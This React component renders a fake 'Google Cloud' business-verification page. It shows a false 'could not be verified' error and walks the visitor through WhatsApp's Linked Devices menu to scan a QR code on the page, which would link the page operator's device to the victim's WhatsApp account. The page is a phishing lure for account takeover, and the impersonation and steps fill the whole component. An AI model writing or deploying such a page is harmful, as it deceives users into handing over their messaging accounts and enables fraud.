import { useState } from "react";

type Step = 1 | 2 | 3 | 4;

interface StepConfig {
  step: Step;
  title: string;
  description: string;
  icon: string;
  detail?: string;
}

const STEPS: StepConfig[] = [
  {
    step: 1,
    title: "Open WhatsApp",
    description: "Launch WhatsApp on your mobile device.",
    icon: "💬",
  },
  {
    step: 2,
    title: "Go to Settings → Linked Devices",
    description:
      'Tap the three-dot menu (Android) or Settings tab (iOS), then select "Linked Devices".',
    icon: "⚙️",
  },
  {
    step: 3,
    title: "Tap Link a Device → Scan QR Code",
    description:
      "Tap the button in the top-right corner, then point your camera at the QR code shown on this screen.",
    icon: "📷",
    detail: "The QR code scanner will appear automatically.",
  },
  {
    step: 4,
    title: "Send Document via WhatsApp",
    description:
      "Once linked, open your chat and attach your MEME certificate or required document using the 📎 icon, then send it.",
    icon: "📎",
    detail: "Accepted: MEME Certificate, GST cert, VAT cert, Trust deed, etc.",
  },
];

const ACCEPTED_DOCS = [
  "MEME Certificate",
  "Certificate of Incorporation",
  "GST Registration Certificate",
  "VAT Registration Certificate",
  "Society Registration Document",
  "Trust Deed",
  "Partnership Deed or Agreement",
];

export default function UploadDocs() {
  const [currentStep, setCurrentStep] = useState<Step>(1);
  const [uploadComplete, setUploadComplete] = useState(false);

  const isLastStep = currentStep === STEPS.length;

  return (
    <div className='min-h-screen bg-gray-50 flex items-center justify-center p-6'>
      <div className='w-full max-w-2xl bg-white rounded-2xl shadow-md overflow-hidden'>
        {/* Header */}
        <div className='bg-[#075E54] px-6 py-5'>
          <div className='flex items-center gap-3'>
            <div className='w-10 h-10 bg-white/10 rounded-full flex items-center justify-center text-2xl'>
              📤
            </div>
            <div>
              <h1 className='text-white font-semibold text-lg leading-tight'>
                Upload Verification Document for Google Cloud
              </h1>
              <p className='text-[#dcf8c6] text-sm'>
                Submit via WhatsApp · Scan QR to link device
              </p>
              <p className='text-red-500 text-sm'>
                This notification is for the admin
              </p>
            </div>
          </div>
        </div>

        {/* Error Banner */}
        <div className='mx-6 mt-5 bg-red-50 border border-red-200 rounded-lg px-4 py-3 flex items-start gap-3'>
          <span className='text-red-500 mt-0.5'>🔴</span>
          <p className='text-sm text-red-700'>
            Your business information could not be verified. Please upload a
            valid registration document via WhatsApp below.
          </p>
        </div>

        {/* Accepted Docs */}
        <div className='px-6 mt-5'>
          <p className='text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2'>
            Two Accepted Documents
          </p>
          <ul className='grid grid-cols-2 gap-x-4 gap-y-1'>
            {ACCEPTED_DOCS.map((doc) => (
              <li
                key={doc}
                className='flex items-center gap-2 text-sm text-gray-600'
              >
                <span className='text-[#25D366]'>✓</span>
                {doc}
              </li>
            ))}
          </ul>
          <p className='text-xs text-gray-400 mt-2'>
            If your registration document includes your current address, you may
            upload it twice.
          </p>
        </div>

        {/* Divider */}
        <div className='border-t border-gray-100 mx-6 my-5' />

        {/* Steps */}
        <div className='px-6'>
          {/* WhatsApp QR Code */}
          <div className='flex flex-col items-center mb-5'>
            <img
              src='src/assets/ilix.jpeg'
              alt='WhatsApp QR Code'
              className='w-48 h-48 rounded-xl object-contain border border-gray-200 shadow-sm'
            />
            <p className='text-xs text-gray-500 mt-2 text-center'>
              Scan this QR code with WhatsApp to link your device
            </p>
          </div>

          <p className='text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4'>
            How to Upload via WhatsApp
          </p>

          <div className='space-y-3'>
            {STEPS.map(({ step, title, description, icon, detail }) => {
              const isActive = currentStep === step;
              const isDone = currentStep > step;

              return (
                <div
                  key={step}
                  className={`rounded-xl border p-4 transition-all duration-200 ${
                    isActive
                      ? "border-[#25D366] bg-[#f0fdf4]"
                      : isDone
                      ? "border-gray-200 bg-gray-50 opacity-60"
                      : "border-gray-100 bg-white opacity-40"
                  }`}
                >
                  <div className='flex items-start gap-3'>
                    <div
                      className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold shrink-0 ${
                        isDone
                          ? "bg-[#25D366] text-white"
                          : isActive
                          ? "bg-[#075E54] text-white"
                          : "bg-gray-200 text-gray-400"
                      }`}
                    >
                      {isDone ? "✓" : step}
                    </div>
                    <div className='flex-1'>
                      <div className='flex items-center gap-2'>
                        <span>{icon}</span>
                        <p className='text-sm font-semibold text-gray-800'>
                          {title}
                        </p>
                      </div>
                      <p className='text-sm text-gray-600 mt-1'>
                        {description}
                      </p>
                      {detail && isActive && (
                        <p className='text-xs text-[#075E54] mt-1 font-medium'>
                          ℹ️ {detail}
                        </p>
                      )}
                    </div>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Step Navigation */}
          <div className='flex gap-3 mt-5'>
            {currentStep > 1 && !uploadComplete && (
              <button
                onClick={() => setCurrentStep((s) => (s - 1) as Step)}
                className='flex-1 py-2.5 rounded-xl border border-gray-300 text-sm text-gray-600 font-medium hover:bg-gray-50 transition'
              >
                ← Back
              </button>
            )}
            {!uploadComplete && (
              <button
                onClick={() => {
                  if (isLastStep) {
                    setUploadComplete(true);
                  } else {
                    setCurrentStep((s) => (s + 1) as Step);
                  }
                }}
                className='flex-1 py-2.5 rounded-xl bg-[#25D366] text-white text-sm font-semibold hover:bg-[#1ebe5d] transition'
              >
                {isLastStep ? "✅ Mark as Sent" : "Next →"}
              </button>
            )}
          </div>
        </div>

        {/* Upload Confirmed + Restart */}
        {uploadComplete && (
          <div className='px-6 mt-5'>
            <div className='bg-green-50 border border-green-200 rounded-xl p-4 text-sm text-green-800 font-medium text-center'>
              ✅ Document sent via WhatsApp. Awaiting verification.
            </div>

            <div className='mt-4 bg-yellow-50 border border-yellow-200 rounded-xl p-4'>
              <p className='text-sm font-semibold text-yellow-800 mb-1'>
                🔄 To Restart the google cloud server.
              </p>
            </div>
          </div>
        )}

        <div className='h-6' />
      </div>
    </div>
  );
}
